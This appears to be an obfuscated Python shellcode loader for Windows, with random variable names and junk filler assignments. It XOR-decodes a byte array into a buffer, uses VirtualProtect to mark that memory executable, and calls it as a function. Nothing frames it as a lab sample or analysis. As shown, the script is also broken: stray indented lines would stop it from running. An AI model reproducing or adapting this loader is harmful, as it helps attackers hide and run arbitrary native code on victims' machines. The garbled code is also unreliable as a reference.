import ctypes
ohgituzq = [67, 177, 11, 254, 50]
zmosaqrb = [191, 249, 136, 26, 194, 168, 68, 180, 130, 50, 124, 215, 81, 15, 102, 71, 203, 40, 32, 125, 66, 94, 202, 155, 212, 16, 204, 48, 252, 238, 232]
    jgavzwya = 19634
    fpjihhgm = 50326
    nusnpudc = 57901
    nsqvhhhy = 35046
yfetcxth = bytes(b ^ zmosaqrb[i % len(zmosaqrb)] for i, b in enumerate(ohgituzq))
wlsgwvas = ctypes.create_string_buffer(yfetcxth, len(yfetcxth))
_p = ctypes.cast(wlsgwvas, ctypes.c_void_p)
_o = ctypes.c_ulong(0)
ctypes.windll.kernel32.VirtualProtect(_p, len(yfetcxth), 0x40, ctypes.byref(_o))
ctypes.cast(wlsgwvas, ctypes.CFUNCTYPE(ctypes.c_void_p))()
